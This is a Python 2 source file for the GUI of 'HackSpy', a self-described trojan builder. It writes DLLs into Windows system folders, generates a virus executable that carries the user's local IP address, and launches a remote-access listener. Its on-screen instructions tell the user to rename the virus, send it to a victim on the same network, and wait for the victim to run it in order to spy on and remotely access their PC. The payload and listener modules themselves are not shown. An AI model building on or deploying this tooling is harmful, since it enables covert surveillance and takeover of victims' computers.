#front screen of HackSpy

from Tkinter import *
import os
import tkMessageBox
import socket
import sys
import webbrowser
from threading import Thread
import os
import shutil

#webbrowser.open('http://www.hackingsimplified.com')

# to go back in directory (this will give effect of cd..)
def back():
    path=os.getcwd()
    print path
    s=path.split('\\')
    length=len(s)
    x=0
    
    while x<(length-1):
        if x==0:
            back_path=s[x]+"\\"
        else:
            back_path=back_path+s[x]+"\\"
        x+=1

    os.chdir(back_path)

#handle the presence of python.dll for building 
def checkPython27dll():
    
    if(os.path.exists('C:\Windows\SysWOW64\python27.dll')):
        None
    else:
        os.chdir('data')
        os.chdir('dependencies')#from data folder it will take requred file and paste it to windows folder
        try:
            #for 64 bit windows machine
            shutil.copyfile('python27.dll','C:\Windows\SysWOW64\python27.dll')
        except:
            None

        try:
            #for 32 bit windows machine
            shutil.copyfile('python27.dll','C:\Windows\System32\python27.dll')
        except:
            None
            
        back()
        back()

#handle the presence of pythoncom27.dll for building 
def checkPythonCom27dll():
    
    if(os.path.exists('C:\Windows\SysWOW64\pythoncom27.dll')):
        None
    else:
        os.chdir('data')
        os.chdir('dependencies')#from data folder it will take requred file and paste it to windows folder
        try:
            shutil.copyfile('pythoncom27.dll','C:\Windows\SysWOW64\pythoncom27.dll')
        except:
            None

        try:
            shutil.copyfile('pythoncom27.dll','C:\Windows\System32\pythoncom27.dll')
        except:
            None
            
        back()
        back()

#handle the presence of pythoncomloader27.dll for building 
def checkPythonComLoader27dll():
    
    if(os.path.exists('C:\Windows\SysWOW64\pythoncomloader27.dll')):
        None
    else:
        os.chdir('data')
        os.chdir('dependencies')#from data folder it will take requred file and paste it to windows folder
        try:
            shutil.copyfile('pythoncomloader27.dll','C:\Windows\SysWOW64\pythoncomloader27.dll')
        except:
            None

        try:
            shutil.copyfile('pythoncomloader27.dll','C:\Windows\System32\pythoncomloader27.dll')
        except:
            None
            
        back()
        back()

#handle the presence of pywintypes27.dll for building 
def checkPyWinTypes27dll():
    
    if(os.path.exists('C:\Windows\SysWOW64\pywintypes27.dll')):
        None
    else:
        os.chdir('data')
        os.chdir('dependencies')#from data folder it will take requred file and paste it to windows folder
        try:
            shutil.copyfile('pywintypes27.dll','C:\Windows\SysWOW64\pywintypes27.dll')
        except:
            None

        try:
            shutil.copyfile('pywintypes27.dll','C:\Windows\System32\pywintypes27.dll')
        except:
            None
            
        back()
        back()

#show info alert box
def info():
    tkMessageBox.showinfo('developer info', 'This tool was build by Prabhat Awasthi\nfor any bug or report plz mail on \nkoolboyprabhat@gmail.com')

#show how to use alert box
def HowToUse():
    tkMessageBox.showinfo('How To Use', 'step 1->click on build trojan button\nstep 2->rename the virus and send it to victim machine on same network\nstep 3->start the listener and wait for the victim to run the virus\nstep 4->when connection is build then select your options.\nTo select multiple options at same time run the start listener multiple times')

# this funtion is used to exit funtion
def out():
    sys.exit(1)
    return None

#activating listener --> this will start listener module already built in tool as .exe
def lis():

    """uncomment while building 
    os.system('listener.exe')"""

    os.system('listener.py')
    
    return None

#this function will start a different lister every time in diff console
def sl():
    t = Thread(target=StartListener)
    t.start()
    return None

# this function starts building an exe exploit for the user's local ip address
def TrojanBuild():
    Cpath=os.getcwd() #getting current path

    checkPython27dll()

    checkPythonCom27dll()

    checkPythonComLoader27dll()

    checkPyWinTypes27dll()
        
        
        
    #getting host local ip address    
    pc_detail = socket.gethostbyname_ex(socket.gethostname())
    try:
        try:
            os.chdir('data')
        except:
            pass
        
        #generating exe --> here python is used as "make.exe" to build exe using parser.py(i.e in built tool complete python is put inside with requred module
        #to build exploit)

        """uncomment while building
        os.system('make.exe passer.py -f ' + str(pc_detail[2][-1]))"""

        os.system('passer.py -f ' + str(pc_detail[2][-1]))
        print 'exploit generating.....check "Build_virus" folder' 
        tkMessageBox.showinfo('report', 'Your virus is generated sucessfully in the "Build Virus" folder\nplzz rename it before use\nGo to detail to know how to use it!!')
    except:
        tkMessageBox.showinfo('report', 'there was a error !!! plzzz report it to developer')

    return None


#staring listener in multiple thread
def StartListener():
    pc_detail = socket.gethostbyname_ex(socket.gethostname())
    try:
        try:
            os.chdir('data')
        except:
            pass

        t = Thread(target=lis)
        t.start()
    except:
        pass

    return None


# to make gui using tkinter
mf = Tk()
mf.title('HackSpy trojans exploit v_3.0 ')
mf.geometry('400x400')
labelText = StringVar()
labelText.set('For More Tools visit hackingsimplified.com\n\nThis tool builds the Trojan Virus \nthis virus will spy on victims computer\nand give his info to you and you will able to access his pc remotely\n\nThis Tool was downloaded from http://www.hackingsimplified.com')
label1 = Label(mf, textvariable=labelText, height=10)
label1.pack()
button1 = Button(mf, text='Build Trojan', width=20, height=3, command=TrojanBuild).pack()
labelText = StringVar()
labelText.set('')
label1 = Label(mf, textvariable=labelText, height=2)
label1.pack()
button2 = Button(mf, text='Start Listener', width=20, height=3, command=sl).pack()
menubar = Menu(mf)
filemenu = Menu(menubar, tearoff=0)
filemenu.add_command(label='start new listener', command=StartListener)
filemenu.add_separator()
filemenu.add_command(label='quit', command=out)
menubar.add_cascade(label='main', menu=filemenu)
helpmenu = Menu(menubar, tearoff=0)
helpmenu.add_cascade(label='how to use', command=HowToUse)
helpmenu.add_cascade(label='developer info', command=info)
menubar.add_cascade(label='help', menu=helpmenu)
mf.config(menu=menubar)
mf.mainloop()
